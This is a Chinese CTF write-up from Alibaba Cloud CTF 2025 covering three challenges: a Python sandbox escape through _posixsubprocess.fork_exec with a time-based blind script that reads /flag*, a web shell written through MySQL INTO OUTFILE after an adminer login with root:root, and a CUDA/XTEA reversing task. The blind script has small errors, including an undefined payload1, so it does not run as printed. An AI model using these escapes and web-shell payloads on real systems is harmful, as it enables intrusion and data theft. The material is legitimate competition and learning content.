---
title: 阿里云 CTF 2025 WriteUp by Min-Venom
contest: 阿里云CTF
year: 2025
difficulty: medium
vuln_type: misc_unknown
tags: [Python-jail, _posixsubprocess, time-blind-injection, source-disclosure, adminer, MySQL-into-outfile, CUDA-PTX, S-box, TEA-cipher, sandbox-bypass]
attack_chain:
  - Web ezoj: _posixsubprocess.fork_exec 绕过 Python 沙箱执行 /bin/sh
  - 时间盲注: 写 /tmp/1.py → if os.popen('cat /flag*').read()[i-1]=='j': time.sleep(2)
  - base64 编码 payload 注入到 echo 'poc2'|base64 -d > /tmp/1.py
  - payload 1: 触发 /tmp/1.py 执行 + 测量响应时间
  - flag = aliyunctf{bb050a11-f64e-4137-8e94-59a37b0ed427}
  - 打卡 OK: login.php~ 源码 + adminer_481.php 数据库直连
  - 登录 root:root 写 shell.php: SELECT "<?php eval($_POST['cmd']);?>" INTO OUTFILE "/var/www/html/shell.php"
  - RE easy-cuda-rev: dump PTX 提取 256 字节 S-box T
  - 加密循环: nibble swap (rs17<<4)|(rs17>>4) + S-box + XOR i
  - 5 个相同循环（外层 10485760 次）+ XTEA-like 加密 8 轮 4 delta
  - delta: 1013904242 (r253), 338241895 (k0), 1013904242 (k2), 939442524 (k1), 1556008596 (k3)
  - 逆逻辑: 先逆 XTEA-like 8 轮，再逆 5 个 10485760 循环，再逆 nibble swap
key_payload: '_posixsubprocess.fork_exec + 时间盲注 + adminer root:root + CUDA S-box + XTEA-like 8 轮'
one_liner: 阿里云 2025：Python _posixsubprocess 沙箱逃逸 + 时间盲注 + adminer 数据库写马 + CUDA S-box + XTEA-like 加密。
lesson: _posixsubprocess.fork_exec 是 Python 沙箱逃逸的隐藏口子；MySQL root:root 默认密码是经典踩点；CUDA PTX 逆向核心是提取常量 S-box。
quality: high
---

# 阿里云 CTF 2025 Writeup by Min-Venom

**来源**: ctfiot.com ID 229032
**战队**: Min-Venom（ChaMd5）

## Web - ezoj（Python 沙箱逃逸 + 时间盲注）
```python
import _posixsubprocess
import os
_posixsubprocess.fork_exec(
    [b"/bin/sh","-c", "ls"], [b"/bin/sh"], True, (), None, None,
    -1, -1, -1, -1, -1, -1, *(os.pipe()),
    False, False, False, None, None, None, -1, None, False
)
```
- `_posixsubprocess.fork_exec` 绕过 Python 沙箱
- 但无回显 → 时间盲注

### 盲注脚本
```python
import base64, requests, time

flag = ''
strings = "qwertyuiopasdfghjklzxcvbnm1234567890{}-"

for i in range(1, 50):
    for j in strings:
        poc1 = f"""
import time, os
if os.popen('cat /flag*').read({i})[{i}-1] == "{j}":
    time.sleep(2)
else:
    print("")
"""
        poc2 = base64.b64encode(poc1.encode('utf-8')).decode()
        payload2 = f"""
import _posixsubprocess, os
_posixsubprocess.fork_exec(
    [b"/bin/sh","-c", "echo'{poc2}'|base64 -d>/tmp/1.py"], [b"/bin/sh"], True,
    (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()),
    False, False, False, None, None, None, -1, None, False
)"""
        # 写文件
        requests.post("http://121.41.238.106:63837/api/submit",
                      json={"problem_id": "0", "code": payload2})
        # 触发
        start = time.time()
        requests.post("http://121.41.238.106:63837/api/submit",
                      json={"problem_id": "0", "code": payload1})
        delay = time.time() - start
        if delay > 2:
            flag += j
            break

# flag = aliyunctf{bb050a11-f64e-4137-8e94-59a37b0ed427}
```

## Web - 打卡 OK
- 目录扫描 → `login.php~` 源码（~ 后缀备份文件泄漏）
- `ok.php` 源码找到 `adminer_481.php` 数据库直连入口
- 默认 root:root 登录
- `SELECT "<?php eval($_POST['cmd']);?>" INTO OUTFILE "/var/www/html/shell.php"`
- 访问 /shell.php 命令执行

## RE - easy-cuda-rev（CUDA + XTEA）
### 加密逻辑
```c
uint8_t* rd3 = (uint8_t*)(rd1 + r4);
uint8_t rs13 = *rd3;
uint16_t rs14 = (uint16_t)r4;
uint16_t rs15 = rs14 * 73;
uint16_t rs16 = rs15 + temp;
uint16_t rs17 = rs13 ^ rs16;
uint16_t rs18 = rs17 & 0xF0;
uint16_t rs19 = rs18 >> 4;
uint16_t rs20 = rs17 << 4;
uint16_t rs58 = rs19 | rs20;  // nibble swap

// 5 个相同循环 10485760 次
for (int i = 0; i < 10485760; i++) {
    uint8_t rs21 = T[rs58 & 0xFF];
    uint16_t rs22 = rs21 >> 4;
    uint16_t rs23 = rs21 << 4;
    uint16_t rs24 = rs22 | rs23;
    rs58 = rs24 ^ (uint16_t)i;
}

// XTEA-like 8 轮
k = {-1556008596, -939442524, 1013904242, 338241895};
for (int i = 0; i < 10485760; i += 8) {
    v0 += (v1<<4+k0) ^ (v1+r252) ^ (v1>>5+k1);
    v1 += (v0<<4+k2) ^ (v0+r252) ^ (v0>>5+k3);
    // ... 7 more rounds with delta r252..r257
    r257 -= 239350328;  // delta 演化
}
```

### 逆向
1. dump PTX（arch=sm_52, code version=[8,0]）提取常量 S-box T[256] + 字符串 `gift1:` ... `gift5:`
2. 5 段分别对应 5 段 flag
3. 逆 XTEA-like 8 轮（delta 从 r257 = -239350328 起每轮 -239350328）
4. 逆 5 个 10485760 循环（从 i = 10485759 反向）
5. 逆 nibble swap：rs17 = (rs58>>4) | ((rs58&0xF)<<4)

## 评价
阿里云 2025 Min-Venom 战队的 3 题 Web + 1 题 RE。亮点：Python `_posixsubprocess.fork_exec` 沙箱逃逸 + 时间盲注 + adminer 数据库写马 + CUDA XTEA 逆向。考察 Python 内部模块、MySQL 注入、CUDA 多个深度。
